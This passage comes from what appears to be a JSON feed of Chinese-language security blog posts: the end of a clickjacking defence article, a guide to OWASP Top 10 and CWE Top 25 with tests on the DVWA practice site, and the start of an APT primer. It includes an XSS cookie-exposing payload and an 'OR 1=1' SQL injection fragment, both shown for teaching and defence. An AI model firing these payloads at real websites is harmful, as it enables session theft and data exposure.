punctuation\">{</span><br>       top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">;</span> <br>   <span class=\"token punctuation\">}</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>先把網頁整個藏起來，一定要執行 JS 才能開啟，所以用上面的 sandbox 阻止 script 執行的話，就只會看到一個空白的網頁；如果不用 sandbox 的話，JS 的檢查不會過，所以還是看到一片空白。</p>\n<p>雖然說這樣可以做到比較完全的防禦，但也有缺點存在。這個缺點就是，如果使用者把 JS 功能關掉的話，他就什麼都看不到了。所以對於把 JS 功能關閉的使用者來說，體驗還滿差的。</p>\n<p>clickjacking 早期出來的時候（2008 年）可能相關防禦還沒有這麼完全，所以只好用這些方案，但在現今 2021 年，瀏覽器已經支援了其他更好的方式來阻擋網頁被嵌入。</p>\n<h3 id=\"x-frame-options\"><a class=\"direct-link\" href=\"#x-frame-options\">#</a> X-Frame-Options</h3>\n<p>這個 HTTP response header 在 2009 年時首先由 IE8 實作，接著其他瀏覽器才跟上，在 2013 年時才變成了完整的 <a href=\"https://www.rfc-editor.org/rfc/rfc7034.txt\">RFC7034</a>。</p>\n<p>這個 header 會有底下這三種值：</p>\n<ol>\n<li>X-Frame-Options: DENY</li>\n<li>X-Frame-Options: SAMEORIGIN</li>\n<li>X-Frame-Options: ALLOW-FROM <a href=\"https://example.com/\">https://example.com/</a></li>\n</ol>\n<p>第一種就是拒絕任何網頁把這個網頁嵌入，包含 <code>&lt;iframe&gt;</code>, <code>&lt;frame&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;applet&gt;</code>, <code>&lt;embed&gt;</code> 這些 tag 都不行。</p>\n<p>第二個則是只有 same origin 的網頁可以，最後一個則是只允許特定的 origin 嵌入，除此之外其他的都不行（只能放一個值不能放列表，所以如果要多個 origin，要像 CORS header 那樣在 server 動態調整輸出）。</p>\n<p>在 RFC 裡面還有特別提到最後兩種的判定方式可能跟你想的不一樣，每個瀏覽器的實作會有差異。</p>\n<p>例如說有些瀏覽器可能只檢查「上一層」跟「最上層」，而不是每一層都檢查。這個「層」是什麼意思呢？因為 iframe 理論上可以有無限多層嘛，A 嵌入 B 嵌入 C 嵌入 D...</p>\n<p>如果把這關係化為類似 html tag 的話，會長得像這樣：</p>\n<pre><code>&lt;example.com/A.html&gt;\n  &lt;attacker.com&gt;\n    &lt;example.com/B.html&gt;\n        &lt;example.com/target.html&gt;\n</code></pre>\n<p>對於最內層的 target.html 來說，如果瀏覽器只檢查上一層（B.html）跟最上層（A.html）的話，那儘管設置成 <code>X-Frame-Options: SAMEORIGIN</code>，檢查還是會通過，因為這兩層確實是相同的 origin。但實際上，中間卻夾了一個惡意網頁在裡面，所以還是有被攻擊的風險。</p>\n<p>除此之外 <code>X-Frame-Options</code> 還有第二個問題，就是 <code>ALLOW-FROM</code> 的支援度不好，可以參考底下來自 <a href=\"https://caniuse.com/?search=X-Frame-Options\">caniuse</a> 的表格，黃色的都是不支援 <code>ALLOW-FROM</code> 的：</p>\n<p><img src=\"/img/posts/huli/clickjacking-intro/caniuse.png\" alt=\"\"></p>\n<p><code>X-Frame-Options</code> 最前面的 <code>X</code> 說明了它比較像是一個過渡時期的東西，在未來新的瀏覽器當中，它的功能會被 CSP（Content Security Policy）給取代，並且把上面提到的問題解決。</p>\n<h3 id=\"csp%3A-frame-ancestors\"><a class=\"direct-link\" href=\"#csp%3A-frame-ancestors\">#</a> CSP: frame-ancestors</h3>\n<p>在之前的文章：<a href=\"https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/\">淺談 XSS 攻擊與防禦的各個環節</a>裡面我有稍微講了一下 CSP 這個東西，基本上就是告訴瀏覽器一些安全性相關的設置，其中有一個屬性是 <code>frame-ancestors</code>，設定起來會像這樣：</p>\n<ol>\n<li>Content-Security-Policy: frame-ancestors 'none'</li>\n<li>Content-Security-Policy: frame-ancestors 'self'</li>\n<li>Content-Security-Policy: frame-ancestors <a href=\"https://a.example.com\">https://a.example.com</a> <a href=\"https://b.example.com\">https://b.example.com</a></li>\n</ol>\n<p>這三種剛好對應到了之前 X-Frame-Options 的三種：DENY, SAMEORIGIN 以及 ALLOW-FROM（但這次有支援多個 origin 了）。</p>\n<p>先講一個可能會被搞混的地方，<code>frame-ancestors</code> 限制的行為跟 X-Frame-Options 一樣，都是「哪些網頁可以把我用 iframe 嵌入」，而另外一個 CSP 規則 <code>frame-src</code> 則是：「我這個網頁允許載入哪些來源的 iframe」。</p>\n<p>例如說我在 index.html 設一個規則是 <code>frame-src: 'none'</code>，那 index.html 裡面用 <code>&lt;iframe&gt;</code> 載入任何網頁都會被擋下來，不管那個網頁有沒有設置任何東西。</p>\n<p>再舉個例子，我的 index.html 設置成：<code>frame-src: https://example.com</code>，但是 <a href=\"http://example.com\">example.com</a> 也有設置：<code>frame-ancestors: 'none'</code>，那 index.html 還是沒有辦法用 iframe 把 <a href=\"http://example.com\">example.com</a> 載入，因為對方拒絕了。</p>\n<p>總而言之，<code>frame-src</code> 是「跟我交往好嗎？」，<code>frame-ancestors</code> 則是對於這個請求的回答。我可以設置成 <code>frame-ancestors: 'none'</code>，代表任何人來跟我告白我都說不要。瀏覽器要成功顯示 iframe，要兩方都同意才行，只要其中一方不同意就會失敗。</p>\n<p>另外，值得注意的是 frame-ancestors 是 CSP level2 才支援的規則，在 2014 年年底才漸漸開始被主流瀏覽器們所支援。</p>\n<h3 id=\"%E9%98%B2%E7%A6%A6%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E9%98%B2%E7%A6%A6%E7%B8%BD%E7%B5%90\">#</a> 防禦總結</h3>\n<p>因為支援度的關係，所以建議 <code>X-Frame-Options</code> 跟 CSP 的 <code>frame-ancestors</code>一起使用，若是你的網頁不想被 iframe 載入，記得加上 HTTP response header：</p>\n<pre><code>X-Frame-Options: DENY\nContent-Security-Policy: frame-ancestors 'none'\n</code></pre>\n<p>若是只允許被 same origin 載入的話，設置成：</p>\n<pre><code>X-Frame-Options: SAMEORIGIN\nContent-Security-Policy: frame-ancestors 'self'\n</code></pre>\n<p>如果要用 allow list 指定允許的來源，則是：</p>\n<pre><code>X-Frame-Options: ALLOW-FROM https://example.com/\nContent-Security-Policy: frame-ancestors https://example.com/\n</code></pre>\n<h2 id=\"%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\">#</a> 實際案例</h2>\n<p>接著我們來看一些實際的 clickjacking 案例，會對這個攻擊更有感覺一點。</p>\n<h3 id=\"yelp\"><a class=\"direct-link\" href=\"#yelp\">#</a> Yelp</h3>\n<p>美國最大的餐廳評論網站 Yelp 有幾個關於 clickjacking 的 report：</p>\n<ol>\n<li><a href=\"https://hackerone.com/reports/305128\">ClickJacking on IMPORTANT Functions of Yelp</a></li>\n<li><a href=\"https://hackerone.com/reports/355859\">CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse.</a></li>\n</ol>\n<p>雖然說沒辦法達到奪取帳號這種很嚴重的攻擊，但還是可以造成一些危害，例如說自己註冊一間餐廳之後：</p>\n<ol>\n<li>幫使用者訂位，藉此偷到他們的 email</li>\n<li>幫使用者訂位，使用者要取消訂位的話就要付取消訂位的費用，造成錢財損失</li>\n</ol>\n<p>對於看不爽的餐廳，也可以靠這方法去製造很多假的訂位，讓餐廳無從辨別（因為都是真的使用者來訂位）</p>\n<h3 id=\"twitter-periscope-clickjacking-vulnerability\"><a class=\"direct-link\" href=\"#twitter-periscope-clickjacking-vulnerability\">#</a> Twitter Periscope Clickjacking Vulnerability</h3>\n<p>原始報告：<a href=\"https://hackerone.com/reports/591432\">https://hackerone.com/reports/591432</a><br>\n日期：2019 年 5 月</p>\n<p>這個 bug 是因為相容性問題，網頁只設置了 <code>X-Frame-Options ALLOW-FROM</code> 而沒有設置 CSP，這樣的話其實沒什麼用，因為現在的瀏覽器都不支援 <code>ALLOW-FROM</code>。</p>\n<p>解法很簡單，就是加上 CSP 的 frame-ancestors，讓現代瀏覽器也遵守這個規則。</p>\n<h3 id=\"highly-wormable-clickjacking-in-player-card\"><a class=\"direct-link\" href=\"#highly-wormable-clickjacking-in-player-card\">#</a> Highly wormable clickjacking in player card</h3>\n<p>原始報告：<a href=\"https://hackerone.com/reports/85624\">https://hackerone.com/reports/85624</a><br>\n日期：2015 年 8 月</p>\n<p>這個漏洞滿有趣的，運用了前面所提到的瀏覽器實作問題。這個案例是 twitter 已經有設置 <code>X-Frame-Options: SAMEORIGIN</code> 跟 <code>Content-Security-Policy: frame-ancestors 'self'</code>，但當時有些瀏覽器實作檢查時，只檢查 top window 是不是符合條件。</p>\n<p>換句話說，如果是 <a href=\"http://twitter.com\">twitter.com</a> =&gt; <a href=\"http://attacker.com\">attacker.com</a> =&gt; <a href=\"http://twitter.com\">twitter.com</a>，就會通過檢查，所以還是可以被惡意網頁嵌入。</p>\n<p>再加上這個漏洞發生在 twitter 的 timeline，所以可以達成蠕蟲的效果，clickjacking 之後就發推，然後就會有更多人看到，更多人發同樣的推文。</p>\n<p>作者的 writeup 寫得很棒，但部落格掛掉了，這是存檔：<a href=\"http://web.archive.org/web/20190310161937/https://blog.innerht.ml/google-yolo/\">Google YOLO</a></p>\n<h3 id=\"%5Bapi.tumblr.com%5D-exploiting-clickjacking-vulnerability-to-trigger-self-dom-based-xss\"><a class=\"direct-link\" href=\"#%5Bapi.tumblr.com%5D-exploiting-clickjacking-vulnerability-to-trigger-self-dom-based-xss\">#</a> [<a href=\"http://api.tumblr.com\">api.tumblr.com</a>] Exploiting clickjacking vulnerability to trigger self DOM-based XSS</h3>\n<p>原始報告：<a href=\"https://hackerone.com/reports/953579\">https://hackerone.com/reports/953579</a><br>\n日期：2020 年 8 月</p>\n<p>會特別挑這個案例，是因為它是攻擊鍊的串接！</p>\n<p>在 XSS 漏洞中有一種叫做 self XSS，意思就是通常都要使用者自己做一些操作才會中招，所以影響十分有限，許多 program 也都不接受 self XSS 的漏洞。</p>\n<p>而這份報告把 self XSS 跟 clickjacking 串連在一起，透過 clickjacking 的方式讓使用者去觸發 self XSS，串連攻擊鍊讓這個攻擊更容易被達成，可行性更高。</p>\n<p>以上就是一些 clickjacking 相關的實際案例，值得注意的是有一些是因為相容性問題造成的 issue，而不是沒有設定，所以設定正確也是很重要的一件事。</p>\n<h2 id=\"%E7%84%A1%E6%B3%95%E9%98%B2%E7%A6%A6%E7%9A%84-clickjacking%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E7%84%A1%E6%B3%95%E9%98%B2%E7%A6%A6%E7%9A%84-clickjacking%EF%BC%9F\">#</a> 無法防禦的 clickjacking？</h2>\n<p>clickjacking 防禦的方式說穿了就是不要讓別人可以嵌入你的網頁，但如果這個網頁的目的就是讓別人嵌入，那該怎麼辦？</p>\n<p>例如說 Facebook widget，大家常看到的那些「讚」跟「分享」的按鈕，就是為了讓其他人可以用 iframe 嵌入的，這類型的 widget 該怎麼辦呢？</p>\n<p>根據這兩篇：</p>\n<ol>\n<li><a href=\"https://www.netsparker.com/blog/web-security/clickjacking-attack-on-facebook-how-tiny-attribute-save-corporation/\">Clickjacking Attack on Facebook: How a Tiny Attribute Can Save the Corporation</a></li>\n<li><a href=\"https://stackoverflow.com/questions/61968091/facebook-like-button-click\">Facebook like button click</a></li>\n</ol>\n<p>裡面得到的資訊，或許目前只能降低一點使用者體驗來換取安全性，例如說點了按鈕之後還會跳出一個 popup 讓你確認，對使用者來說多了一個點擊，但是也避免了 likejacking 的風險。</p>\n<p>或是我猜可能也會根據網站的來源決定是否有這個行為，舉例來說在一些比較有信譽的網站，可能就不會跳出這個 popup。</p>\n<p>我有做了一個簡單的 demo 網頁：<a href=\"https://aszx87410.github.io/demo/clickjacking/like.html\">https://aszx87410.github.io/demo/clickjacking/like.html</a></p>\n<p>如果 likejacking 成功的話，點了按鈕之後會對 Facebook Developer Plugin 的粉專按讚（我自己實驗是有成功啦），大家可以試試看，按完以後可以按「顯示原始網頁」看看按鈕底下長什麼樣子，順便把讚收回來。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>比起以前瀏覽器支援度還沒有這麼完整的時代，現在已經幸福許多了，瀏覽器也實作了愈來愈多的安全性功能以及新的 response header，透過瀏覽器保護使用者避免惡意攻擊。</p>\n<p>雖然說平均來講 clickjacking 的攻擊難易度、先備條件以及影響程度通常都比 XSS 或是 CSRF 之類的攻擊來得低，但依然是不可忽視的風險之一。</p>\n<p>如果你的網頁沒有要讓別的網站嵌入，記得設置 <code>X-Frame-Options: DENY</code> 以及 <code>Content-Security-Policy: frame-ancestors 'none'</code>，告訴瀏覽器你的網頁不能被嵌入，藉此防止點擊劫持攻擊。</p>\n<p>參考資料：</p>\n<ol>\n<li><a href=\"https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPCLICKJACKING.md\">TOPCLICKJACKING.md</a></li>\n<li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#x-frame-options-header-types\">Clickjacking Defense Cheat Sheet</a></li>\n<li><a href=\"https://content-security-policy.com/frame-ancestors/\">CSP frame-ancestors</a></li>\n</ol>\n",
      "date_published": "2021-08-26T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/owasp-cwe/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/owasp-cwe/",
      "title": "資安規範實戰篇 : OWASP + CWE",
      "content_html": "<p><img src=\"/img/posts/nick/owasp-cwe/owasp_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>沒有人希望自己的網站被攻擊，但工程師想做好資安防護就像廚師想燒出一桌好菜，剛開始想參考食譜來做菜，發現食譜種類好多，同一道菜有好各式各樣的做法，到底該怎麼選怎麼做才對 ?</p>\n<p>選擇太多會讓開發人員一陣混亂，本文的目標就是整理 2 個由名國際組織整理出來對資安漏洞的排名與分類，然後藉由靶站來示範如何利用這些資料，快速的找網站可能的漏洞與修補建議。</p>\n<!-- summary -->\n<h2 id=\"%E6%9C%89%E9%82%A3%E4%BA%9B%E8%B3%87%E5%AE%89%E8%A6%8F%E7%AF%84-%3F\"><a class=\"direct-link\" href=\"#%E6%9C%89%E9%82%A3%E4%BA%9B%E8%B3%87%E5%AE%89%E8%A6%8F%E7%AF%84-%3F\">#</a> 有那些資安規範 ?</h2>\n<p>要先看懂食譜才有辦法做菜 ! 所以這邊介紹 2 組由知名國際組織整理出來的常見資安問題排名，然後利用知名靶站 DVWA(註1) 來示範如何利用這些資訊，達到快速找出網站常見問題的目的。</p>\n<h3 id=\"owasp-top-10%EF%BC%88open-web-application-security-project%EF%BC%89\"><a class=\"direct-link\" href=\"#owasp-top-10%EF%BC%88open-web-application-security-project%EF%BC%89\">#</a> OWASP TOP 10（Open Web Application Security Project）</h3>\n<ul>\n<li><strong>簡介</strong>:<br>\n藉由社群的力量蒐集各種網頁安全漏洞，歸納出容易攻擊的弱點，定期彙整出前 10 大資安問題，更新頻率較高（2~4 年）。</li>\n<li><strong>命名方式</strong>:<br>\n排名 + 發布年份 + 漏洞名稱<br>\n ex. A1:2017-Injection （2017 年排名第 1 的漏洞為注入問題）</li>\n<li><strong>使用範例</strong>:\n<ol>\n<li>\n<p><strong>選擇要檢查的問題</strong>:<br>\n到 Owap Top 10 (<a href=\"https://owasp.org/www-project-top-ten/\">https://owasp.org/www-project-top-ten/</a>)點選要查詢的類型，這邊選排名第一的 Injection 問題為當範例。<img src=\"/img/posts/nick/owasp-cwe/owasp_2.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>找出問題發生特徵</strong>:<br>\n點進去找一下問題可能發生在哪裡，或是如何分辨問題，範例中從 Attack Vectors 的敘述得知 Injection 類型的問題只要在有輸入的地方都有可能發生。<img src=\"/img/posts/nick/owasp-cwe/owasp_3.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>找出可能的問題點</strong>:<br>\n到自己的網站找出所有可疑的地方，範例中是 DVWA 準備好的 SQL Injection 弱點輸入位置，該位置原本的功能是輸入 ID 編號來查詢用戶資料，實際上測試的時候應該要把全部的問題點都找出來。<img src=\"/img/posts/nick/owasp-cwe/owasp_4.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>測試是否真的有弱點</strong>:<br>\n對輸入點進行測試來驗證是否真的有弱點(如果對該弱點不熟悉的話可以參考 Owasp 中的 Example Attack Scenarios 欄位)，範例中是靶站準備好的 SQL Injection 弱點，攻擊方法是選自 Owasp 的 Example 中利用 SQL 語法的 OR 來導出所有資料。<br>\n4-1. Owasp 提供的 Injection 弱點範例<img src=\"/img/posts/nick/owasp-cwe/owasp_5.jpg\" alt=\"\"><br>\n4-2. DVWA Injection 弱點攻擊測試<img src=\"/img/posts/nick/owasp-cwe/owasp_6_2.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>嘗試修復發現的問題</strong>:<br>\n參考 Owasp 中 How to Prevent 欄位提供的建議進行修復。<img src=\"/img/posts/nick/owasp-cwe/owasp_7.jpg\" alt=\"\"></p>\n</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"cwe-%2F-sans-top-25-%EF%BC%88common-weakness-enumeration%EF%BC%89\"><a class=\"direct-link\" href=\"#cwe-%2F-sans-top-25-%EF%BC%88common-weakness-enumeration%EF%BC%89\">#</a> CWE / SANS TOP 25 （Common Weakness Enumeration）</h3>\n<ul>\n<li>簡介:<br>\n由國際組織 MITRE 主導，透過對 SANS 與其他資安專家進行訪談調查來制定通用缺陷列表，彙整為前 25 大資安問題，更新頻率較低（8 年）。</li>\n<li>命名方式:<br>\n發現順序 + 漏洞名稱<br>\n ex. CWE-79 Cross-site Scripting (XSS)<br>\n（2021 年排名第 2 的漏洞為跨站腳本，排名需查表）</li>\n<li><strong>使用範例</strong>:\n<ol>\n<li>\n<p><strong>選擇要檢查的問題</strong>:<br>\n到 CWE Top 25 (<a href=\"https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html\">https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html</a>)點選要查找的問題，這邊以排名第一的 Cross-site Scripting 問題為例。<img src=\"/img/posts/nick/owasp-cwe/owasp_8.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>找出問題發生特徵</strong>:<br>\n從敘述中找出關於問題發生點的資訊<img src=\"/img/posts/nick/owasp-cwe/owasp_9.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>找出所有可能的問題點</strong>:<br>\n到自己的網站找出所有可疑的地方，範例中是 DVWA 準備好的 XSS 弱點輸入位置，該位置原本的功能是將輸入文字顯示出來，實際上測試的時候應該要把全部的問題點都找出來。<img src=\"/img/posts/nick/owasp-cwe/owasp_10.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>逐個測試是否真的有弱點</strong>:<br>\n對輸入點進行測試來驗證是否真的有弱點(如果對該弱點不熟悉的話可以參考 CWE 中的 Demonstrative Examples 欄位)，範例中是靶站準備好的 XSS 弱點，攻擊方法是參考 CWE 的 Example 中利用 JS 語法的 Alert 來彈出視窗，但這邊進行深入一點的攻擊藉由彈出視窗的機會導出較敏感的 Cookie 資訊。<br>\n4-1. CWE 提供的 XSS 弱點範例<img src=\"/img/posts/nick/owasp-cwe/owasp_11.jpg\" alt=\"\"><br>\n4-2. 輸入下列 script 進行攻擊測試<br>\n<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><img src=\"/img/posts/nick/owasp-cwe/owasp_12.jpg\" alt=\"\"><br>\n4-3. 攻擊結果<img src=\"/img/posts/nick/owasp-cwe/owasp_13.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>嘗試修復發現的問題</strong>:<br>\n參考 CWE 中 Potential Mitigations 欄位中的建議進行修復。<br>\n<img src=\"/img/posts/nick/owasp-cwe/owasp_14.jpg\" alt=\"\"></p>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"%E6%9C%89%E5%95%8F%E9%A1%8C%E5%85%88%E6%89%BE%E8%AA%B0-%3F\"><a class=\"direct-link\" href=\"#%E6%9C%89%E5%95%8F%E9%A1%8C%E5%85%88%E6%89%BE%E8%AA%B0-%3F\">#</a> 有問題先找誰 ?</h2>\n<p>OWASP 跟 CWE，重視效率的開發者可能覺得 Owasp Top 10 選了前 10 常見的問題，先解決這 10 個問題才是 CP 值最高的做法，實際上並非如此，原因就藏在這張 Owasp Top 10 與 CWE Top 25 的對照表中。</p>\n<p><img src=\"/img/posts/nick/owasp-cwe/owasp_15.jpg\" alt=\"\"></p>\n<p>從這張圖可以明顯看出來雖然 Owasp Top 10 項目較少，但它每一個項目的範圍較大，換句話說處理 Owasp 不會比 CWE 快多少，實際上含蓋的範圍大小是差不多的，當今天你做資安檢測不是為了來自業主的合規需求時，選擇那一個規範優其實是由目的來決定的。</p>\n<p>當使用者擔心自己的網站有資安問題，想要解決掉問題的時候會推薦先找 CWE ，因為它的項目分的比較細，說明與解決方案比起 Owasp 比來更具有針對性，所以藉由這些說明解決問題的機率也更高，這邊用兩種規範排名都很高的 Injection 舉個例子，開發者肯定知道自己的網站有沒有用到資料庫，假設有用到的話就要特別注意網站有沒有 SQL Injection 問題，當要藉由這些資安規範來解決問題時，查詢 <a href=\"https://cwe.mitre.org/data/definitions/89.html\">CWE-89 SQL Injection</a> 裡面的資料會比起 <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Owasp A1:2017-Injection</a> 更有效率。</p>\n<p>當使用者要評估一個不一定是自己的網站到底安不安全，則會建議先用 Owasp，一樣用 Injection 來舉一個例子，當你今天發現別人開發的網站上有一個輸入欄位沒有進行任何檢查，可以輸入所有種號的特殊符號，但你不確定後面用的是哪種技術或套件，這時候 <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Owasp A1:2017-Injection</a> 就有關於 Injection 的整體評估和分析後面可能用了哪些套件會導致問題發生，而 CWE 的話還要想辦法做進一步測試才能確定屬於那一個類型。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>分享一下對於網站開發人員建議的資安檢視步驟，與各類標準使用時機。</p>\n<p><strong>1. 確認開發工具與套件版本 : CVE</strong><br>\n在開發之前請先去到 CVE Details 查一下用到的工具或套件是否已有弱點，用了有弱點的套件或工具開發高機率導致網站先天不良，如果非用不可則需要把弱點藏好或避開有弱點的功能。</p>\n<p><strong>2. 避開常見弱點 : OWASP TOP 10, CWE TOP 25</strong><br>\n從開始開發到完成這個階段特別要注意避開常見的資安問題，畢竟資安要做到完美成本過高，一般網站很難做到 100 分，但解決常見弱點能大幅的增加駭客攻擊成本，你家的鎖只要比鄰居家的鎖更好，小偷就不喜歡到你家偷東西，沒有人願意把時間在難搞的目標上，駭客也是一樣。</p>\n<p><strong>3. 安全性測試(模擬攻擊） : ATT&amp;CK</strong><br>\n不管是處理完弱點或建立好防護後都需要一個驗證的機制，模擬一下駭客的攻擊是否會成功，避免做了白工卻不自知，這時候最好的方法是交給第三方的資安廠商來做測試，不只有專業的資安人員為你服務，也能避免測試時球員兼裁判的問題，但礙於成本考量或者網站屬於不可公開的內部系統，就推薦參考 ATT&amp;CK 來自行建立一個較全面的測試，降低前述問題帶來的影響。</p>\n<p>本文主要介紹的內容與第 2 項避開常見弱點有比較直接的關係，這部份是與開發最相關也是影響最大的一部分，之後有機會在分享有關第 1 項與第 3 項中用到的其他類型資安規範。</p>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h2>\n<blockquote>\n<p><a href=\"https://owasp.org/\">https://owasp.org/</a><br>\n<a href=\"https://cwe.mitre.org/\">https://cwe.mitre.org/</a><br>\n<a href=\"https://cve.mitre.org/\">https://cve.mitre.org/</a><br>\n<a href=\"https://www.cvedetails.com/\">https://www.cvedetails.com/</a><br>\n<a href=\"https://attack.mitre.org/\">https://attack.mitre.org/</a></p>\n</blockquote>\n",
      "date_published": "2021-08-23T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-APT/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-APT/",
      "title": "零基礎資安系列（六）- 電影中酷駭客做的事？關於 APT（Advanced Persistent Threat）",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p><strong>電影中的駭客只是敲敲打打幾分鐘就可以竊取商業機密？！</strong><br>\n答案是但也不是，為什麼會這麼說呢？<br>\n成功的攻擊結果也許只需要短短的幾分鐘就能將商業機密帶走，但在駭客敲鍵盤的那幾分鐘之前，其實就已經花了好幾個月甚至以年記的時間來佈局這幾分鐘的攻擊，那駭客的佈局到底是在佈局什麼呢，這就是今天想和大家分享的，電影中那些酷駭客在完成攻擊前所做的事。</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> 釋例</h2>\n<p>電影中，駭客所執行的方式，其實在業界稱之為<strong>進階持續性威脅（Advanced Persistent Threat）</strong> 也就是所謂的 APT，那這種攻擊厲害在哪呢？<br>\n其實 APT 並不是一種攻擊手法，而是一整套的攻擊手法及流程彙整，舉個例來說，葉問開始學習武術，攻擊的手法不外乎便是左勾拳（Phishing）、右勾拳（OS injection），而當他將這些攻擊進行<strong>變化</strong>並且<strong>整合</strong>起來，摸索出克敵之道成為流派之後，便可以稱之為 詠春（APT）！，額外說明一下 APT 與攻擊鏈概念很像，所以我會在下面說明 APT 所擁有的要素和案例說明。</p>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p1.jpeg\" /><figcaption><p>photo by 電影-葉問</p>\n</figcaption></figure></p>\n<h2 id=\"apt%EF%BC%88advanced-persistent-threat%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F\"><a class=\"direct-link\" href=\"#apt%EF%BC%88advanced-persistent-threat%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F\">#</a> APT（Advanced Persistent Threat）是什麼？</h2>\n<p>開宗明義，APT 就是以<strong>進階有變化</strong>的攻擊手法，<strong>持續並嘗試不被發現</strong>的入侵目標，並且竊取資料掌控系統<strong>對目標造成威脅</strong>。</p>\n<h3 id=\"%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0-apt-%E9%80%9A%E5%B8%B8%E6%9C%83%E5%8C%85%E5%90%AB%E4%B8%89%E7%A8%AE%E8%A6%81%E7%B4%A0%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0-apt-%E9%80%9A%E5%B8%B8%E6%9C%83%E5%8C%85%E5%90%AB%E4%B8%89%E7%A8%AE%E8%A6%81%E7%B4%A0%EF%BC%9A\">#</a> 上面提到 APT 通常會包含三種要素：</h3>\n<p><strong>1.進階性（Advanced）</strong><br>\n<strong>上勾拳無法打敗對手，但昇龍拳可以</strong><br>\n一般使用工具執行的攻擊手法，例如 SQL Injection 的 OR 1=1--' 便不算是一種進階的攻擊手法，若同樣以 SQL Injection 來舉例，可能便是透過公司的<strong>網路曝險</strong>和相關的測試找出公司使用的資料庫類型以及版本，甚至從錯誤訊息中獲得資訊，藉以構建針對目標的 SQL Injection  payload，便可以稱為一種進階的手法。</p>\n<p><strong>2.持續性（Persistent）</strong><br>\n<strong>直接放大絕招容易被閃躲，所以持續不斷的試探，讓對手露出破綻</strong><br>\n就像是大開大闔的攻擊總是特別容易被阻擋，因此藉由緩慢而低調的各種測試和收集資訊方式，慢慢的尋找突破口，不求快速有成效，只求持續而且不被發現便可以稱為持續性。</p>\n<p><strong>3.威脅性（Threat）</strong><br>\n<strong>攻擊一定會造成傷勢，攻擊可能造成的傷勢越重表示威脅性越高</strong><br>\n駭客攻擊一定有目的，無論是直接透過勒索軟體藉此勒索贖金，或是竊取商業機密資料來獲取利益，甚至是破壞公司的服務或是客戶資料造成商譽受損，這些都是所謂的威脅性。</p>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p2.jpeg\" /><figcaption><p>photo by pexels</p>\n</figcaption></figure></p>\n<h3 id=\"apt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%8E%E6%AE%B5\"><a class=\"direct-link\" href=\"#apt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%8E%E6%AE%B5\">#</a> APT 